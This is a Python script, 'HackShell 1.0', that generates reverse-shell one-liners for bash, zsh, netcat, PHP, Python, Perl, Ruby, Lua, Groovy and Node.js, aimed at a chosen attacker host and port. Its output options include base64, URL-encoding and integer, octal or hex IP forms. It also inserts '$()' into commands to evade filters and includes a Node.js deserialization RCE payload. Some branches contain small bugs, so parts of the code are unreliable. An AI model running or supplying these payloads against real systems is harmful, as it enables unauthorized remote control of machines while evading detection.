import sys, urllib.parse, base64, struct, socket

def menu():
    return print(""".------..------..------..------..------..------..------..------..------.
|H.--. ||A.--. ||C.--. ||K.--. ||S.--. ||H.--. ||E.--. ||L.--. ||L.--. |
| :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || :/\: |
| (__) || :\/: || :\/: || :\/: || :\/: || (__) || :\/: || (__) || (__) |
| '--'H|| '--'A|| '--'C|| '--'K|| '--'S|| '--'H|| '--'E|| '--'L|| '--'L|
`------'`------'`------'`------'`------'`------'`------'`------'`------'
HackShell 1.0\n\n--lhost: ip\n--lport: port\n--payload: bash,zsh,nc,php,python,perl,ruby,lua,groovy,nodejs,all\n--types: b64,urle,int,octa,hex,jlre,func\n\ne.g.\npython hackshell.py --payload zsh --lhost 192.168.0.20 --lport 443 --type urle\n""")

def ReverseShellBash(ip, port, type):
    rsba = ''.join(("ba$()sh -$()i '/dev/tcp/"+ip+"/"+port," 0>&1'"))
    message_bytes = rsba.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == 'd':
        print(rsba)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsba2 = ''.join(("ba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsba2 = ''.join(("ba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsba2 = ''.join(("ba$()sh -$()i >& /dev/tcp/"+str(ip2)+"/"+port," 0>&1"))
        print(rsba2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellzsh(ip, port, type):
    rsz = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+ip,port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
    message_bytes = rsz.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == 'd':
        print(rsz)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsz2 = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+str(ip2),port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
        print(rsz2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsz2 = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+str(ip2),port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
        print(rsz2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsz2 = ''.join(("zsh -c 'zmodload zsh/net/tcp && ztcp"+str(ip2),port+"&& zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"))
        print(rsz2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellNetcat(ip, port, type):
    rsnc = ''.join(("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+ip+" "+port, " >/tmp/f"))
    message_bytes = rsnc.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == 'd':
        print(rsnc)
    elif type == 'b64':
        print(base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsnc2 = ''.join(("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+str(ip2),port, " >/tmp/f"))
        print(rsnc2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsnc2 = ''.join(("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|n$()c "+str(ip2),port," >/tmp/f"))
        print(rsnc2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPhp(ip, port,type):
    rsph = ''.join(("ph$()p -$()r '$sock=fsockopen("+"\""+ ip +"\"" +","+port+');exec("/bin/sh -i <&3 >&3 2>&3");\''))
    message_bytes = rsph.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == 'd':
        print(rsph)
    elif type == 'b64':
        print(base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsph2 = ''.join(("ph$()p -$()r '$sock=fsockopen(""\""+ str(ip2) +"\"" +","+port,');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsph2 = ''.join(("ph$()p -$()r '$sock=fsockopen(""\""+ str(ip2) +"\"" +","+port,');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsph2 = ''.join(("ph$()p -$()r '$sock=fsockopen(""\""+ str(ip2) +"\"" +","+port,');exec("/bin/sh -i <&3 >&3 2>&3");\''))
        print(rsph2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPython(ip, port,type):
    rspy = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
    message_bytes = rspy.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    
    if type == 'd':
        print(rspy)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rspy2 = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(ip2)+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rspy2 = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(ip2)+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rspy2 = ''.join(("py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+str(ip2)+"\","+port+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"))
        print(rspy2)
    elif type == "jlre":
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellPerl(ip, port,type):
    rspe = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+ip+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
    message_bytes = rspe.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == "d":
        print(rspe)
    elif type == 'b64':
        print(base64_message)
    elif type =='urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rspe2 = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+str(ip2)+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rspe2 = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+ str(ip2)+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rspe2 = ''.join(("pe$()rl -$()e 'use Socket;$i=\""+ str(ip2)+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"))
        print(rspe2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellRuby(ip, port, type):
    rsr = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+ip+"\","+port+"))'"))
    message_bytes = rsr.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == "d":
        print(rsr)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsr2 = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+str(ip2)+"\","+port+"))'"))
        print(rsr2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsr2 = ''.join(("ru$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+str(ip2)+"\","+port+"))'"))
        print(rsr2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsr2 = ''.join(("r$()by -rsocket -$()e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\""+str(ip2)+"\","+port+"))'"))
        print(rsr2)
    elif type == 'jlre':
        print ("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellLua(ip, port, type):
    rsl = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+ip+"\"','"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
    message_bytes = rsl.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')

    if type == "d":
        print(rsl)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsl2 = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+str(ip2)+"\",'"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
        print(rsl2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsl2 = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+str(ip2)+"\",'"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
        print(rsl2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsl2 = ''.join(("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('\""+str(ip2)+"\",'"+port+"');os.execute('sh -i <&3 >&3 2>&3');\""))
        print(rsl2)
    elif type == 'jlre':
        print("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellGroovy(ip, port, type):
    rsg = ''.join(("""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+ip+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""))
    message_bytes = rsg.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    if type == "d":
        print(rsg)
    elif type == 'b64':
        print(base64_message)
    elif type == 'urle':
        urltype = urllib.parse.quote(message_bytes)
        print(urltype)
    elif type == 'long':
        ip2 = struct.unpack("!I", socket.inet_aton(ip))[0]
        rsg2 = ''.join(("""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+str(ip2)+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""))
        print(rsg2)
    elif type == 'octa':
        ip2 = '.'.join(format(int(x), '04o') for x in ip.split('.'))
        rsg2 = ''.join(("""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+str(ip2)+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""))
        print(rsg2)
    elif type == 'hex':
        ip2='0x{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip.split('.')))
        rsg2 = ''.join((""""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/"""+str(ip2)+"""/"""+port+""";cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()"""))
        print(rsg2)
    elif type == 'jlre':
        print("bash -c {echo,"+base64_message+"}|{base64,-d}|{bash,-i}")

def ReverseShellnodejs(ip, port, type):
    if type == "d":
        print("require('child_process').exec('nc -e sh",ip,port+"')")
    elif type == "func":
        print("{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").execSync(\\\"/bin/b$()ash -c '/bin/sh -i >& /dev/tcp/"+ip+"/"+port,"0>&1\'\\\")}()\"}")

try:
    payload = sys.argv[sys.argv[:].index('--payload')+1]
    if  payload == "bash" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
            type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]
        ReverseShellBash(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1],type)

    elif payload == "zsh" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
                type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]
        ReverseShellzsh(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif payload == "nc" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
            type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]  
        ReverseShellNetcat(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif payload == "php" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
                type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]  
        ReverseShellPhp(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif payload == "python" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
                type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]  
        ReverseShellPython(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif payload == "perl" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
                type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]
        ReverseShellPerl(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif payload == "ruby" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
                type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]
        ReverseShellRuby(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif payload == "lua" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
                type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]
        ReverseShellLua(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif payload == "groovy" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
            type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]
            ReverseShellGroovy(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif payload == "nodejs" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=7:
            type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]
        ReverseShellnodejs(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)

    elif sys.argv[sys.argv[:].index('--payload')+1] == "all" and sys.argv[:].index('--lhost') and sys.argv[:].index('--lport'):
        if len(sys.argv) <=8:
            print(len(sys.argv))
            type = "d"
        else:
            type=sys.argv[sys.argv[:].index('--type')+1]
        ReverseShellBash(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
        ReverseShellzsh(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
        ReverseShellNetcat(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
        ReverseShellPython(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
        ReverseShellPerl(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
        ReverseShellRuby(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
        ReverseShellLua(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
        ReverseShellGroovy(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
        ReverseShellnodejs(sys.argv[sys.argv[:].index('--lhost')+1], sys.argv[sys.argv[:].index('--lport')+1], type)
    elif sys.argv[:].index('--help'):
        menu()
except:
    menu()
    print("Some parameter is missing...")